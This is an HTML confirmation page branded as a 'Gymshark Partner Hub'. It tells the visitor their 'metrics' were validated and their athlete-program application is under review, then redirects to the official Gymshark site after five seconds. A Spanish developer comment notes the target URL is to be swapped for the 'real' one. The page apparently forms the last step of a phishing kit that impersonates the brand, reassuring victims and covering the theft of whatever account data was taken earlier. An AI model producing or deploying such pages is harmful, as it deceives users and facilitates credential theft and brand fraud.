<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Submitted | Gymshark Partner Hub</title>
    <style>
        :root {
            --bg-dark: #000000;
            --text-main: #FFFFFF;
            --text-secondary: #9B9B9B;
            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            font-family: var(--font-family);
            background-color: var(--bg-dark);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            padding: 20px;
        }

        
        .header-logo {
            margin-bottom: 35px;
            display: flex;
            justify-content: center;
            width: 100%;
        }

        .custom-logo {
            height: 40px;      
            width: auto;       
            display: block;
            object-fit: contain;
        }

        
        @media (min-width: 768px) {
            .custom-logo {
                height: 35px; 
            }
        }

        h1 {
            font-size: 2.3rem;
            font-weight: 900;
            line-height: 1.1;
            text-transform: uppercase;
            letter-spacing: -0.8px;
            margin-bottom: 15px;
        }

        p {
            color: var(--text-secondary);
            font-size: 1rem;
            line-height: 1.5;
            max-width: 400px;
            margin-bottom: 20px;
        }

        .check-icon {
            color: #4CAF50;
            font-size: 50px;
            margin-bottom: 15px;
        }

        .loader {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(255,255,255,0.2);
            border-radius: 50%;
            border-top-color: #FFFFFF;
            animation: spin 1s linear infinite;
            margin-top: 30px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<header class="header-logo">
    <img src="LogoG.png" alt="Logo" class="custom-logo">
</header>

    <div class="check-icon">✓</div>
    <h1>Metrics Connected</h1>
    <p>
        Metrics Connected
Your metrics have been successfully validated. Your application for the Athlete Program is now under review.Check your Gmail inbox
    </p>
    <p style="font-size: 0.8rem; color: #777;">
        You will be redirected shortly, please check our official website...
    </p>

    <div class="loader"></div>

    <script>
        
        setTimeout(() => {
            window.location.href = 'https://www.gymshark.com/es-US'; // Cambiar ala URL real deseada
        }, 5000); 
    </script>

</body>
</html>
